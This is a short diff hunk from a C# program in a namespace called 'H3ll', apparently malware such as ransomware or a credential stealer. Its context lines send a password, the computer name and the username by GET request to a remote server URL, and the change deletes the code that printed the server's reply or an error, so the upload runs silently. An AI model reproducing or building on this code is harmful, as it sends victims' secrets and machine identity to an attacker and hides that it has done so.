@@ -143,15 +143,6 @@ namespace H3ll
                 string queryString = $"?password={password}&computerName={computerName}&username={username}";
                 string requestUrl = serverUrl + queryString;
                 HttpResponseMessage response = client.GetAsync(requestUrl).Result;
-                if (response.IsSuccessStatusCode)
-                {
-                    string responseBody = response.Content.ReadAsStringAsync().Result;
-                    Console.WriteLine("Resposta do servidor: " + responseBody);
-                }
-                else
-                {
-                    Console.WriteLine("Erro ao enviar a requisição. Código de status: " + response.StatusCode);
-                }
             }
         }
 
